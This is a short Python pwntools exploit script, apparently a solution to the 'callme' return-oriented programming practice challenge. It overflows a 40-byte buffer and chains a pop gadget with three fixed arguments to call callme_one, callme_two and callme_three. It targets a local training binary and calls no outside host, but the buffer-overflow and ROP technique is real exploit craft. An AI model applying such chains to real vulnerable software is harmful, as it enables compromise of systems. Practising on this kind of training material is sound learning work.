#!/usr/bin/env python3
# 
 
from pwn import *

BINARY="./callme"




gadget_addr=p64(0x000000000040093c)

# callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
param_01=p64(0xdeadbeefdeadbeef)
param_02=p64(0xcafebabecafebabe)
param_03=p64(0xd00df00dd00df00d)

#0x00000000004006f0  callme_three@plt
#0x0000000000400720  callme_one@plt
#0x0000000000400740  callme_two@plt
fct_addr_01=p64(0x0000000000400720) 
fct_addr_02=p64(0x0000000000400740) 
fct_addr_03=p64(0x00000000004006f0) 

payload  = b'A' * 40
payload += gadget_addr+param_01+param_02+param_03+fct_addr_01
payload += gadget_addr+param_01+param_02+param_03+fct_addr_02
payload += gadget_addr+param_01+param_02+param_03+fct_addr_03


 
prog = process(BINARY, stdin=PIPE, stdout=PIPE)
print(prog.readuntil(">").decode())
prog.writeline(payload)

print(prog.recvall().decode())
print(prog.wait())

exit()
try:
    while 1:
        print(prog.readline().decode())
except EOFError:
    print("[X] EOFError")
except TypeError:
    print("[X] TypeError")
except Exception as e: 
    print("Exception: ")
    print(type(e))


print(prog.wait())